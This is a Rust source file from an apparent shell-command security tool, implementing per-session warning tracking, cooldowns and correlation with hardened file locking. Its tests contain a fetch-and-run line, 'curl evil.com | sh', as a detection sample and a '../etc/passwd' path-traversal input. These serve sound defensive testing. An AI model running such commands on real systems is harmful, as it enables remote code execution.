//! Per-session warning accumulator: tracks warnings across commands within a
//! shell session so escalation rules can detect repeated suspicious behavior.
//!
//! State is JSON at `state_dir()/sessions/{session_id}.json`. All I/O is
//! best-effort: failures never alter the verdict or panic.

use std::collections::VecDeque;
use std::fs::{self, OpenOptions};
use std::io::Write;
use std::path::{Path, PathBuf};

use fs2::FileExt;
use serde::{Deserialize, Serialize};

use crate::verdict::{Evidence, Finding};

/// Maximum warning events retained per session.
const MAX_EVENTS: usize = 100;
/// Maximum escalation events retained per session.
const MAX_ESCALATION_EVENTS: usize = 20;
/// Maximum hidden events retained per session.
const MAX_HIDDEN_EVENTS: usize = 50;
/// W7: maximum typed events retained per session for cross-event correlation.
const MAX_TYPED_EVENTS: usize = 200;
/// W7: pathological-growth BACKSTOP for surfaced-correlation signatures. The
/// primary eviction is now lockstep with the event window (a marker is dropped
/// only once none of its source timestamps remain among the live `typed_events`;
/// see [`correlate_session`]), so this cap is a safety ceiling, NOT the dedup
/// boundary. It is sized well above the number of distinct correlations a
/// [`MAX_TYPED_EVENTS`]-event window can produce so it never evicts a marker whose
/// source events are still in-window (which would let the same hit re-emit).
const MAX_SURFACED_CORRELATIONS: usize = MAX_TYPED_EVENTS * 4;

/// Per-session warning accumulator.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SessionWarnings {
    pub session_id: String,
    pub session_start: String,
    pub total_warnings: u32,
    /// Aggregate hidden findings (for backward compat / quick total).
    #[serde(default)]
    pub hidden_findings: u32,
    /// Hidden findings broken down by severity (recorded at detection time).
    #[serde(default)]
    pub hidden_low: u32,
    #[serde(default)]
    pub hidden_info: u32,
    pub events: VecDeque<WarningEvent>,
    /// Escalation events: records when an escalation rule fired, scoped per
    /// (rule_id, domain) key. Used for cooldown matching.
    #[serde(default)]
    pub escalation_events: VecDeque<EscalationEvent>,
    /// Findings hidden by paranoia filtering, for `tirith warnings --hidden`.
    #[serde(default)]
    pub hidden_events: VecDeque<HiddenEvent>,
    /// W6 — per-rule suppression cooldowns: `rule_key -> expires_at` (RFC3339).
    /// Session-backed so one-shot CLI / hook processes honor a cooldown that an
    /// earlier invocation started.
    #[serde(default)]
    pub cooldowns: std::collections::BTreeMap<String, String>,
    /// W7: bounded ring of typed events for cross-event correlation. Recorded
    /// AFTER each verdict is finalized (only for security-relevant signals), and
    /// consumed by [`correlate_session`]. Off the hot path; capped to
    /// [`MAX_TYPED_EVENTS`].
    #[serde(default)]
    pub typed_events: VecDeque<crate::event_buffer::TypedEvent>,
    /// W7: signatures of correlation hits already surfaced this session, so a hit
    /// whose A-then-B pair (or delete burst) is still inside its window on the next
    /// command is surfaced exactly once. Expired in LOCKSTEP with the event window:
    /// a signature is retained while ANY of its source event timestamps remain among
    /// the live [`typed_events`](Self::typed_events), and dropped once they have all
    /// aged out (see [`correlate_session`]). [`MAX_SURFACED_CORRELATIONS`] is only a
    /// pathological-growth backstop, not the dedup boundary.
    #[serde(default)]
    pub surfaced_correlations: VecDeque<String>,
}

/// A single warning event within a session.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WarningEvent {
    pub timestamp: String,
    pub rule_id: String,
    pub severity: String,
    pub title: String,
    pub command_redacted: String,
    pub domains: Vec<String>,
}

/// Records when an escalation rule fired, for cooldown scoping. `rule_id` is the
/// crossing rule or `"*"` for aggregate; `domain` is set only for
/// `domain_scoped` rules (one domain's escalation doesn't cool down others).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EscalationEvent {
    pub timestamp: String,
    pub rule_id: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub domain: Option<String>,
}

/// A finding that was hidden by paranoia filtering (recorded for `tirith warnings --hidden`).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HiddenEvent {
    pub timestamp: String,
    pub rule_id: String,
    pub severity: String,
    pub title: String,
    pub command_redacted: String,
}

impl SessionWarnings {
    /// Create a new empty accumulator.
    fn new(session_id: &str) -> Self {
        Self {
            session_id: session_id.to_string(),
            session_start: chrono::Utc::now().to_rfc3339(),
            total_warnings: 0,
            hidden_findings: 0,
            hidden_low: 0,
            hidden_info: 0,
            events: VecDeque::new(),
            escalation_events: VecDeque::new(),
            hidden_events: VecDeque::new(),
            cooldowns: std::collections::BTreeMap::new(),
            typed_events: VecDeque::new(),
            surfaced_correlations: VecDeque::new(),
        }
    }

    /// Count events matching `rule_id` within the last `window_minutes`.
    pub fn count_by_rule(&self, rule_id: &str, window_minutes: u64) -> u32 {
        let cutoff = cutoff_time(window_minutes);
        self.events
            .iter()
            .filter(|e| e.rule_id == rule_id && e.timestamp.as_str() >= cutoff.as_str())
            .count() as u32
    }

    /// Count events matching both `rule_id` and `domain` within the window.
    pub fn count_by_rule_and_domain(
        &self,
        rule_id: &str,
        domain: &str,
        window_minutes: u64,
    ) -> u32 {
        let cutoff = cutoff_time(window_minutes);
        let domain_lower = domain.to_lowercase();
        self.events
            .iter()
            .filter(|e| {
                e.rule_id == rule_id
                    && e.timestamp.as_str() >= cutoff.as_str()
                    && e.domains.iter().any(|d| d.to_lowercase() == domain_lower)
            })
            .count() as u32
    }

    /// Count all events within the window.
    pub fn count_all(&self, window_minutes: u64) -> u32 {
        let cutoff = cutoff_time(window_minutes);
        self.events
            .iter()
            .filter(|e| e.timestamp.as_str() >= cutoff.as_str())
            .count() as u32
    }

    /// Top rules by frequency (descending).
    pub fn top_rules(&self) -> Vec<(String, u32)> {
        let mut counts = std::collections::HashMap::<String, u32>::new();
        for e in &self.events {
            *counts.entry(e.rule_id.clone()).or_default() += 1;
        }
        let mut sorted: Vec<_> = counts.into_iter().collect();
        sorted.sort_by_key(|s| std::cmp::Reverse(s.1));
        sorted
    }
}

/// Compute the RFC 3339 cutoff timestamp for windowed queries.
fn cutoff_time(window_minutes: u64) -> String {
    let cutoff =
        chrono::Utc::now() - chrono::Duration::minutes(window_minutes.min(u32::MAX as u64) as i64);
    cutoff.to_rfc3339()
}

/// Validate session_id and return the state file path.
///
/// Session IDs must be non-empty, <=128 chars, and contain only
/// `[a-zA-Z0-9_-]` to prevent path traversal.
pub fn session_state_path(session_id: &str) -> Option<PathBuf> {
    if session_id.is_empty() || session_id.len() > 128 {
        return None;
    }
    if !session_id
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_')
    {
        return None;
    }
    let state = crate::policy::state_dir()?;
    Some(state.join("sessions").join(format!("{session_id}.json")))
}

/// Path to the cross-process lock file guarding a session: `<session_id>.json.lock`.
///
/// A DEDICATED lock file (stable inode) is locked rather than the session JSON
/// itself, because [`with_session_locked`] now replaces the data file via an atomic
/// temp+rename. Locking the data file and then renaming over it would leave the
/// lock on the stale (old) inode, so a second writer could acquire the lock on the
/// new inode and clobber the first. Locking a separate file that is never renamed
/// keeps writers serialized across the whole read/modify/write while the rename
/// stays crash-atomic. Mirrors the pending store's `pending.json.lock`.
fn session_lock_path(session_id: &str) -> Option<PathBuf> {
    session_state_path(session_id).map(|p| {
        let mut name = p.file_name().unwrap_or_default().to_os_string();
        name.push(".lock");
        p.with_file_name(name)
    })
}

/// Upper bound on a session JSON we will read. A real session (bounded warning
/// events, cooldowns, and a 200-entry typed-event ring) is far smaller; the cap
/// bounds the read so a malicious or runaway file is not slurped, and pairs with the
/// regular-file + no-follow refusal in [`crate::util::read_text_no_follow_capped`].
const SESSION_FILE_READ_CAP: u64 = 8 * 1024 * 1024;

/// Load session warnings from disk; a fresh (empty) accumulator on any error.
///
/// Reads via [`crate::util::read_text_no_follow_capped`] (the same helper the policy
/// and scan read paths use): O_NOFOLLOW refuses a symlinked session file, O_NONBLOCK
/// plus an fd-based regular-file check refuses a FIFO / device / socket (so a planted
/// non-regular file cannot hang `tirith warnings`), and a size cap refuses an
/// oversized file before any read. `with_session_locked` writes via an atomic
/// temp+rename, so a reader sees a complete old-or-new file and needs no shared lock
/// to avoid a transient empty state.
pub fn load(session_id: &str) -> SessionWarnings {
    let path = match session_state_path(session_id) {
        Some(p) => p,
        None => return SessionWarnings::new(session_id),
    };

    let bytes = match crate::util::read_text_no_follow_capped(&path, SESSION_FILE_READ_CAP) {
        Ok(b) => b,
        // Missing is the normal "no session yet" (silent).
        Err(crate::util::OpenRegularError::NotFound) => return SessionWarnings::new(session_id),
        // A symlink / FIFO / device / oversized / unreadable file: never block, never
        // read a foreign inode; degrade to a fresh accumulator with a diagnostic.
        Err(_) => {
            crate::audit::audit_diagnostic(format!(
                "tirith: session: refusing non-regular, oversized, or unreadable {}; using fresh state",
                path.display()
            ));
            return SessionWarnings::new(session_id);
        }
    };
    if bytes.is_empty() {
        return SessionWarnings::new(session_id);
    }
    serde_json::from_slice::<SessionWarnings>(&bytes).unwrap_or_else(|e| {
        crate::audit::audit_diagnostic(format!(
            "tirith: session: corrupt state for '{session_id}': {e}; resetting"
        ));
        SessionWarnings::new(session_id)
    })
}

/// W6 — per-rule suppression cooldown, session-backed so one-shot CLI / hook
/// processes share the window. Returns `true` if `rule_id` (optionally scoped to
/// `target`) is CURRENTLY within its cooldown, meaning the caller should collapse
/// the finding into a rollup rather than surfacing it again; otherwise it starts
/// a fresh cooldown and returns `false`. A suppressed hit is never dropped
/// silently: it emits a compact `finding_suppressed` audit rollup.
///
/// CALL SITE (W6): this is wired at the `tirith check` DISPLAY path
/// (`crate::cli::check` → `build_display_verdict`), which collapses repeated Warn
/// / WarnAck findings in the user-facing `write_human` output only. It is strictly
/// an output/UX-layer change: it NEVER suppresses an `Action::Block` (only
/// findings that, classified alone, map to Warn/WarnAck are candidates), never
/// feeds back into detection, and never alters the verdict, exit code, audit log,
/// approval/ack files, or session accounting. The `finding_suppressed`
/// audit-rollup contract (the "never dropped silently" guarantee) is exercised
/// end-to-end by `suppress_check_emits_finding_suppressed_rollup`.
pub fn suppress_check(
    session_id: &str,
    rule_id: &str,
    target: Option<&str>,
    cooldown_secs: u64,
) -> bool {
    let key = crate::suppression::cooldown_key(rule_id, target);
    let now = chrono::Utc::now().to_rfc3339();
    // Clamp before the i64 cast: a raw `cooldown_secs as i64` above i64::MAX wraps
    // NEGATIVE, placing the expiry in the PAST and instantly expiring the cooldown.
    // Clamp to u32::MAX seconds (~136 years), the same idiom `cutoff_time` /
    // `is_within_minutes` use, which is far beyond any real cooldown and keeps
    // both `Duration::seconds` (no internal-ms overflow) and the `Utc::now() + dur`
    // addition (no DateTime-range overflow) well-defined and panic-free.
    let cooldown_secs = cooldown_secs.min(u32::MAX as u64) as i64;
    let expires = (chrono::Utc::now() + chrono::Duration::seconds(cooldown_secs)).to_rfc3339();
    let mut suppressed = false;
    with_session_locked(session_id, |sw| {
        // Prune ALL expired cooldown entries (not only `key`) so `cooldowns` cannot
        // grow unbounded across many distinct rule/target keys in a long-lived
        // session, which would inflate the lock-held parse/serialize cost on every
        // update. RFC3339 UTC timestamps compare correctly as strings.
        sw.cooldowns.retain(|_, exp| exp.as_str() > now.as_str());
        if crate::suppression::is_suppressed(&mut sw.cooldowns, &key, &now) {
            suppressed = true;
        } else {
            crate::suppression::record(&mut sw.cooldowns, &key, expires.clone());
        }
    });
    if suppressed {
        crate::audit::log_hook_event(
            "suppression",
            "cooldown",
            "finding_suppressed",
            None,
            Some(&format!("rule_id={rule_id}")),
        );
    }
    suppressed
}

/// Record warning findings (thin wrapper around `record_outcome`, no hidden
/// findings).
pub fn record_warning(session_id: &str, findings: &[&Finding], cmd: &str, dlp_patterns: &[String]) {
    record_outcome(session_id, findings, &[], cmd, dlp_patterns);
}

/// Record warning + hidden findings into the session accumulator. Hidden
/// findings are full `Finding` refs (not counts) so event details can be stored
/// for `tirith warnings --hidden`. Atomic via [`with_session_locked`]; never
/// panics or alters the verdict on I/O failure.
pub fn record_outcome(
    session_id: &str,
    warn_findings: &[&Finding],
    hidden_findings_list: &[&Finding],
    cmd: &str,
    dlp_patterns: &[String],
) {
    if warn_findings.is_empty() && hidden_findings_list.is_empty() {
        return;
    }

    let hidden_count = hidden_findings_list.len() as u32;
    let hidden_low = hidden_findings_list
        .iter()
        .filter(|f| f.severity == crate::verdict::Severity::Low)
        .count() as u32;
    let hidden_info = hidden_findings_list
        .iter()
        .filter(|f| f.severity == crate::verdict::Severity::Info)
        .count() as u32;

    // Pre-compute redacted command outside the lock to minimise hold time.
    let command_redacted = crate::redact::redact_command_text(cmd, dlp_patterns);
    let command_redacted = crate::util::truncate_bytes(&command_redacted, 120);
    let now = chrono::Utc::now().to_rfc3339();

    // Collect finding data we need so the closure does not borrow the slices.
    struct FindingData {
        rule_id: String,
        severity: String,
        title: String,
        domains: Vec<String>,
    }
    let finding_data: Vec<FindingData> = warn_findings
        .iter()
        .map(|f| FindingData {
            rule_id: f.rule_id.to_string(),
            severity: f.severity.to_string(),
            title: crate::util::truncate_bytes(&f.title, 120),
            domains: extract_domains_from_evidence(&f.evidence),
        })
        .collect();

    // Collect hidden finding data for HiddenEvent storage.
    let hidden_data: Vec<FindingData> = hidden_findings_list
        .iter()
        .map(|f| FindingData {
            rule_id: f.rule_id.to_string(),
            severity: f.severity.to_string(),
            title: crate::util::truncate_bytes(&f.title, 120),
            domains: Vec::new(), // not needed for hidden events
        })
        .collect();

    with_session_locked(session_id, |session| {
        session.hidden_findings = session.hidden_findings.saturating_add(hidden_count);
        session.hidden_low = session.hidden_low.saturating_add(hidden_low);
        session.hidden_info = session.hidden_info.saturating_add(hidden_info);

        for fd in &finding_data {
            let event = WarningEvent {
                timestamp: now.clone(),
                rule_id: fd.rule_id.clone(),
                severity: fd.severity.clone(),
                title: fd.title.clone(),
                command_redacted: command_redacted.clone(),
                domains: fd.domains.clone(),
            };
            session.events.push_back(event);
            session.total_warnings = session.total_warnings.saturating_add(1);
        }

        for hd in &hidden_data {
            session.hidden_events.push_back(HiddenEvent {
                timestamp: now.clone(),
                rule_id: hd.rule_id.clone(),
                severity: hd.severity.clone(),
                title: hd.title.clone(),
                command_redacted: command_redacted.clone(),
            });
        }

        while session.events.len() > MAX_EVENTS {
            session.events.pop_front();
        }
        while session.hidden_events.len() > MAX_HIDDEN_EVENTS {
            session.hidden_events.pop_front();
        }
    });
}

/// Record escalation events. Called from `post_process_verdict` after an
/// escalation upgrades the action; separate from `record_outcome` because
/// escalated `Action::Block`s skip the Warn/WarnAck recording gate.
pub fn record_escalation_event(session_id: &str, hits: &[crate::escalation::EscalationHit]) {
    if hits.is_empty() {
        return;
    }

    let now = chrono::Utc::now().to_rfc3339();

    with_session_locked(session_id, |session| {
        for hit in hits {
            session.escalation_events.push_back(EscalationEvent {
                timestamp: now.clone(),
                rule_id: hit.rule_id.clone(),
                domain: hit.domain.clone(),
            });
        }
        while session.escalation_events.len() > MAX_ESCALATION_EVENTS {
            session.escalation_events.pop_front();
        }
    });
}

/// W7: append a typed event to the session's correlation ring. Called AFTER a
/// verdict is finalized, ONLY for security-relevant signals (never for a clean
/// Allow with no findings). Best-effort and off the hot path; the ring is capped
/// to [`MAX_TYPED_EVENTS`] (oldest dropped first).
pub fn record_typed_event(session_id: &str, event: crate::event_buffer::TypedEvent) {
    with_session_locked(session_id, move |session| {
        session.typed_events.push_back(event);
        while session.typed_events.len() > MAX_TYPED_EVENTS {
            session.typed_events.pop_front();
        }
    });
}

/// W7: run cross-event correlation over the session's typed-event ring as of
/// now, returning only hits NOT already surfaced this session.
///
/// Because the typed-event ring is never drained, a single recorded sequence
/// stays correlatable on every subsequent command until it falls out of its
/// window. To avoid re-emitting the same CRITICAL hit on each command, every
/// returned hit's [`signature`](crate::event_buffer::CorrelationHit::signature)
/// (rule id + triggering-event timestamps) is recorded in the session's
/// `surfaced_correlations` marker under the lock; a hit whose signature is
/// already present is filtered out.
///
/// ATOMICITY: for each fresh hit, the de-dup signature AND the corresponding
/// [`WarningEvent`] are persisted in the SAME locked mutation, before the lock is
/// released. The signature marks the hit "already surfaced"; the `WarningEvent`
/// is what `tirith warnings` and repeat-count logic read. Splitting these across
/// two writes (the previous design) risked marking a hit surfaced while a second,
/// best-effort write of its `WarningEvent` failed or never ran (process exit) —
/// permanently dropping the first hit from `tirith warnings`. Doing both under one
/// lock makes that impossible: either both land or neither does (a write failure
/// leaves the whole session record unchanged, so the hit re-surfaces next time).
///
/// The post-override severity (the same value the verdict path applies via
/// `policy.severity_override`) is persisted, so `tirith warnings` never disagrees
/// with the verdict when a `severity_overrides` lever remapped a correlation rule.
/// `cmd` is redacted + truncated OUTSIDE the lock to keep hold time short.
/// Best-effort overall: if the single write fails, no marker is persisted, so at
/// worst a hit re-surfaces rather than being lost.
pub fn correlate_session(
    session_id: &str,
    cmd: &str,
    policy: &crate::policy::Policy,
    dlp_patterns: &[String],
) -> Vec<crate::event_buffer::CorrelationHit> {
    let now = chrono::Utc::now().to_rfc3339();
    // Redact + truncate the command once, outside the lock, to minimise hold time
    // (mirrors `record_outcome`); it is identical for every hit this call surfaces.
    let command_redacted = crate::redact::redact_command_text(cmd, dlp_patterns);
    let command_redacted = crate::util::truncate_bytes(&command_redacted, 120);
    let mut fresh = Vec::new();
    with_session_locked(session_id, |session| {
        let events: Vec<crate::event_buffer::TypedEvent> =
            session.typed_events.iter().cloned().collect();
        let already: std::collections::HashSet<&str> = session
            .surfaced_correlations
            .iter()
            .map(|s| s.as_str())
            .collect();
        let hits = crate::event_buffer::correlate(&events, &now);
        // Collect fresh hits (signature not yet surfaced) without mutating the
        // session while `already` still borrows it.
        let new_hits: Vec<crate::event_buffer::CorrelationHit> = hits
            .into_iter()
            .filter(|h| !already.contains(h.signature.as_str()))
            .collect();
        drop(already);
        for hit in new_hits {
            // Mark the signature surfaced AND append the warning event in the same
            // locked mutation, so the two can never diverge.
            session
                .surfaced_correlations
                .push_back(hit.signature.clone());
            // Persist the POST-override (effective) severity, matching the verdict.
            let severity = policy
                .severity_override(&hit.rule_id)
                .unwrap_or(hit.severity);
            session.events.push_back(WarningEvent {
                timestamp: now.clone(),
                rule_id: hit.rule_id.to_string(),
                severity: severity.to_string(),
                title: crate::util::truncate_bytes(&hit.title, 120),
                command_redacted: command_redacted.clone(),
                domains: Vec::new(),
            });
            session.total_warnings = session.total_warnings.saturating_add(1);
            fresh.push(hit);
        }
        // Expire surfaced-correlation markers in LOCKSTEP with the event window
        // rather than by an independent smaller cap. A correlation can only re-fire
        // while the events that produced it are still in `typed_events`; its
        // signature embeds exactly those source timestamps. So a marker is safe to
        // drop only once NONE of its source timestamps remain among the live typed
        // events: until then it must stay to keep the hit deduped. (A smaller
        // independent cap evicted markers whose source events were still in-window,
        // letting the same correlation re-emit and double-count.) `MAX_SURFACED_
        // CORRELATIONS` remains as a generous pathological-growth backstop only.
        let live_stamps: std::collections::HashSet<&str> = session
            .typed_events
            .iter()
            .map(|e| e.timestamp.as_str())
            .collect();
        session.surfaced_correlations.retain(|sig| {
            crate::event_buffer::signature_event_timestamps(sig).any(|ts| live_stamps.contains(ts))
        });
        drop(live_stamps);
        while session.surfaced_correlations.len() > MAX_SURFACED_CORRELATIONS {
            session.surfaced_correlations.pop_front();
        }
        while session.events.len() > MAX_EVENTS {
            session.events.pop_front();
        }
    });
    fresh
}

/// Shared atomic lock-read-modify-write: take an exclusive cross-process lock on a
/// DEDICATED `<session>.json.lock` file, read-or-create state from the session JSON,
/// run `mutate`, then persist the new JSON CRASH-ATOMICALLY (temp file in the same
/// dir, fsync, atomic rename over the session file, best-effort parent-dir fsync),
/// unlock, GC.
///
/// The persist is via temp+rename rather than an in-place `set_len(0)` truncate so a
/// crash / ENOSPC after truncation can never leave the session file empty or
/// partial: the old file stays intact until the rename publishes the fully-written
/// replacement. Because the rename swaps the data file's inode, the serializing lock
/// is taken on a SEPARATE lock file (stable inode) instead of the data file, exactly
/// like the pending store; locking the data file and renaming over it would orphan
/// the lock on the old inode and let a concurrent writer clobber it.
///
/// All I/O is best-effort; failures are logged and never panic. The read path is
/// unchanged: a missing/empty/corrupt session resets to a fresh accumulator.
fn with_session_locked<F>(session_id: &str, mutate: F)
where
    F: FnOnce(&mut SessionWarnings),
{
    let path = match session_state_path(session_id) {
        Some(p) => p,
        None => return,
    };
    let lock_path = match session_lock_path(session_id) {
        Some(p) => p,
        None => return,
    };

    if let Some(parent) = path.parent() {
        if let Err(e) = fs::create_dir_all(parent) {
            crate::audit::audit_diagnostic(format!(
                "tirith: session: cannot create state dir {}: {e}",
                parent.display()
            ));
            return;
        }
    }

    // Refuse to follow symlinks at the session file (Unix). The temp+rename writes a
    // brand-new inode, but a planted symlink at `path` would still be read below and
    // (post-rename) replaced; reject it before any read, matching the prior guard.
    #[cfg(unix)]
    {
        match std::fs::symlink_metadata(&path) {
            Ok(meta) if meta.file_type().is_symlink() => {
                crate::audit::audit_diagnostic(format!(
                    "tirith: session: refusing to follow symlink at {}",
                    path.display()
                ));
                return;
            }
            _ => {}
        }
    }

    // Refuse to follow a symlink at the LOCK file too (Unix), matching the session
    // file's guard above. A symlinked lock path could redirect lock IDENTITY to an
    // attacker-chosen inode, so two writers lock different files and the
    // serialization guarantee for the read/modify/write below is lost.
    #[cfg(unix)]
    {
        match std::fs::symlink_metadata(&lock_path) {
            Ok(meta) if meta.file_type().is_symlink() => {
                crate::audit::audit_diagnostic(format!(
                    "tirith: session: refusing to follow symlink at lock {}",
                    lock_path.display()
                ));
                return;
            }
            _ => {}
        }
    }

    // Open (creating if needed) and exclusively lock the DEDICATED lock file. The
    // lock (not the data file) serializes the whole read/modify/write so the
    // atomic rename below stays correct.
    let mut lock_opts = OpenOptions::new();
    lock_opts.read(true).write(true).create(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt;
        lock_opts.mode(0o600);
        // No-follow on the final component closes the pre-check -> open TOCTOU: a
        // symlink planted at `lock_path` between the check above and this open is
        // refused atomically by the open itself (ELOOP).
        lock_opts.custom_flags(libc::O_NOFOLLOW);
    }
    let lock_file = match lock_opts.open(&lock_path) {
        Ok(f) => f,
        Err(e) => {
            crate::audit::audit_diagnostic(format!(
                "tirith: session: cannot open lock {}; escalation may be impaired: {e}",
                lock_path.display()
            ));
            return;
        }
    };
    let locked = lock_file.lock_exclusive().is_ok() || lock_file.try_lock_exclusive().is_ok();
    if !locked {
        crate::audit::audit_diagnostic(format!(
            "tirith: session: cannot lock {}; recording skipped",
            lock_path.display()
        ));
        return;
    }

    // Read the existing session WHILE holding the lock, via the no-follow + regular-
    // file + size-capped helper. O_NOFOLLOW refuses a symlinked `path`, O_NONBLOCK plus
    // an fstat regular-file check refuses a FIFO / device / socket (so a planted
    // non-regular file cannot block the writer), and the cap bounds the read. A missing
    // file is the normal "fresh session" case; any other refusal skips the mutation
    // (fail closed; the lock is released when this function returns) rather than read or
    // overwrite a foreign / non-regular file.
    let bytes = match crate::util::read_text_no_follow_capped(&path, SESSION_FILE_READ_CAP) {
        Ok(b) => b,
        Err(crate::util::OpenRegularError::NotFound) => Vec::new(),
        Err(_) => {
            crate::audit::audit_diagnostic(format!(
                "tirith: session: refusing non-regular, oversized, or unreadable {}; recording skipped",
                path.display()
            ));
            return;
        }
    };
    // Parse the bytes DIRECTLY (serde_json::from_slice), exactly as `load()` does, so
    // the reader and writer treat invalid UTF-8 inside the JSON identically (corrupt
    // resets to a fresh accumulator) rather than the writer silently lossy-decoding it
    // to U+FFFD and persisting the mangled state.
    let mut session: SessionWarnings = if bytes.is_empty() {
        SessionWarnings::new(session_id)
    } else {
        serde_json::from_slice(&bytes).unwrap_or_else(|e| {
            crate::audit::audit_diagnostic(format!(
                "tirith: session: corrupt state for '{session_id}': {e}; resetting"
            ));
            SessionWarnings::new(session_id)
        })
    };

    mutate(&mut session);

    let json = match serde_json::to_string(&session) {
        Ok(j) => j,
        Err(e) => {
            crate::audit::audit_diagnostic(format!(
                "tirith: session: failed to serialize warnings: {e}"
            ));
            let _ = fs2::FileExt::unlock(&lock_file);
            return;
        }
    };

    if let Err(e) = write_session_atomic(&path, json.as_bytes()) {
        crate::audit::audit_diagnostic(format!(
            "tirith: session: atomic write failed for {}: {e}",
            path.display()
        ));
    }

    let _ = fs2::FileExt::unlock(&lock_file);

    opportunistic_gc();
}

/// Crash-atomically replace the session file at `path` with `bytes`: write to a temp
/// file in the SAME directory, fsync it, atomically rename it over `path`, then
/// best-effort fsync the parent directory so the new directory entry is durable.
/// Mirrors the pending store's `save_map`. The caller holds the session lock, so the
/// rename cannot race a concurrent writer.
fn write_session_atomic(path: &Path, bytes: &[u8]) -> std::io::Result<()> {
    use tempfile::NamedTempFile;
    let dir = path
        .parent()
        .ok_or_else(|| std::io::Error::other("session path has no parent dir"))?;
    let mut tmp = NamedTempFile::new_in(dir)?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let _ = tmp
            .as_file()
            .set_permissions(std::fs::Permissions::from_mode(0o600));
    }
    tmp.write_all(bytes)?;
    // fsync the temp file BEFORE the rename so a crash between write and rename can
    // never publish an empty/partial session: the old file stays until the rename.
    tmp.as_file().sync_all()?;
    tmp.persist(path)
        .map_err(|e: tempfile::PersistError| e.error)?;
    // fsync the parent dir so the rename's new name -> inode entry is crash-durable.
    // The publish already succeeded, so a dir-fsync failure is LOGGED, not propagated
    // (Windows: opening a directory as a File fails, where this helper is a no-op).
    crate::util::fsync_parent_dir_logged(path, "session state write");
    Ok(())
}

/// Extract hostnames from finding evidence.
pub fn extract_domains_from_evidence(evidence: &[Evidence]) -> Vec<String> {
    let mut domains = Vec::new();
    for ev in evidence {
        match ev {
            Evidence::Url { raw } => {
                if let Some(host) = extract_host(raw) {
                    domains.push(host);
                }
            }
            Evidence::HostComparison { raw_host, .. } => {
                domains.push(raw_host.to_lowercase());
            }
            _ => {}
        }
    }
    domains.sort();
    domains.dedup();
    domains
}

/// Extract host from a URL string.
fn extract_host(url: &str) -> Option<String> {
    if let Ok(parsed) = url::Url::parse(url) {
        return parsed.host_str().map(|h| h.to_lowercase());
    }
    // Schemeless fallback: first segment before `/`.
    let candidate = url.split('/').next()?;
    if candidate.contains('.') && !candidate.contains(' ') {
        let host = candidate.split(':').next().unwrap_or(candidate);
        return Some(host.to_lowercase());
    }
    None
}

/// Opportunistic garbage collection of stale session files.
///
/// Rate-limited to once per hour via a `.last_gc` marker file in the sessions
/// directory. Uses a 72-hour cutoff for stale sessions.
fn opportunistic_gc() {
    let gc_marker = match crate::policy::state_dir() {
        Some(d) => d.join("sessions").join(".last_gc"),
        None => return,
    };
    if let Ok(meta) = fs::metadata(&gc_marker) {
        if let Ok(modified) = meta.modified() {
            if let Ok(age) = modified.elapsed() {
                if age.as_secs() < 3600 {
                    return;
                }
            }
        }
    }
    // Touch the marker file before running GC (best-effort).
    let _ = fs::write(&gc_marker, "");
    gc_stale_sessions(72);
}

/// Remove session files older than `max_age_hours`.
pub fn gc_stale_sessions(max_age_hours: u64) {
    let state = match crate::policy::state_dir() {
        Some(s) => s,
        None => return,
    };
    let sessions_dir = state.join("sessions");
    let entries = match fs::read_dir(&sessions_dir) {
        Ok(e) => e,
        Err(_) => return,
    };

    let max_age = std::time::Duration::from_secs(max_age_hours * 3600);
    let now = std::time::SystemTime::now();

    for entry in entries.flatten() {
        let path = entry.path();
        if path.extension().and_then(|e| e.to_str()) != Some("json") {
            continue;
        }
        let meta = match fs::metadata(&path) {
            Ok(m) => m,
            Err(_) => continue,
        };
        let modified = match meta.modified() {
            Ok(t) => t,
            Err(_) => continue,
        };
        if let Ok(age) = now.duration_since(modified) {
            if age > max_age {
                let _ = fs::remove_file(&path);
            }
        }
    }
}

/// Delete a session file.
pub fn clear_session(session_id: &str) {
    if let Some(path) = session_state_path(session_id) {
        let _ = fs::remove_file(&path);
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::verdict::{Evidence, Finding, RuleId, Severity};

    fn make_finding(rule_id: RuleId, severity: Severity) -> Finding {
        Finding {
            rule_id,
            severity,
            title: "Test finding".to_string(),
            description: "desc".to_string(),
            evidence: vec![Evidence::Url {
                raw: "https://evil.example.com/path".to_string(),
            }],
            human_view: None,
            agent_view: None,
            mitre_id: None,
            custom_rule_id: None,
        }
    }

    #[test]
    fn test_session_state_path_validation() {
        // Valid IDs
        assert!(session_state_path("abc-123_DEF").is_some());
        assert!(session_state_path("a").is_some());

        // Reject empty
        assert!(session_state_path("").is_none());

        // Reject path traversal
        assert!(session_state_path("../etc/passwd").is_none());
        assert!(session_state_path("foo/bar").is_none());
        assert!(session_state_path("..").is_none());

        // Reject special chars
        assert!(session_state_path("foo bar").is_none());
        assert!(session_state_path("foo.bar").is_none());

        // Reject too long
        let long_id = "a".repeat(129);
        assert!(session_state_path(&long_id).is_none());

        // Accept max length
        let max_id = "a".repeat(128);
        assert!(session_state_path(&max_id).is_some());
    }

    #[test]
    fn test_load_returns_default_on_missing() {
        let session = load("nonexistent-session-id-12345");
        assert_eq!(session.session_id, "nonexistent-session-id-12345");
        assert_eq!(session.total_warnings, 0);
        assert!(session.events.is_empty());
    }

    #[cfg(unix)]
    #[test]
    fn test_record_and_load_cycle() {
        let _guard = crate::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(|e| e.into_inner());

        let dir = tempfile::tempdir().unwrap();
        let state_home = dir.path().join("state");
        unsafe { std::env::set_var("XDG_STATE_HOME", &state_home) };

        let session_id = "test-session-rec-001";

        // Record two findings
        let f1 = make_finding(RuleId::CurlPipeShell, Severity::High);
        let f2 = make_finding(RuleId::NonAsciiHostname, Severity::Medium);
        record_warning(session_id, &[&f1, &f2], "curl evil.com | sh", &[]);

        // Load and verify
        let session = load(session_id);
        assert_eq!(session.total_warnings, 2);
        assert_eq!(session.events.len(), 2);
        assert_eq!(session.events[0].rule_id, "curl_pipe_shell");
        assert_eq!(session.events[1].rule_id, "non_ascii_hostname");

        // Verify domains extracted
        assert!(session.events[0]
            .domains
